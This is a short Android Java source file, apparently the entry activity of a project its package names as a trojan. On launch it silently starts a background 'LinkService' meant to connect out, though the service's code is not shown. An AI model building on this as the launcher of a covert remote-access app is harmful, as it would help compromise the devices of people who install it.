package com.liuyihui.trojan;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import com.liuyihui.trojan.linkserver.LinkService;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //启动连接服务
        Intent intent = new Intent(this, LinkService.class);
        startService(intent);
    }
}
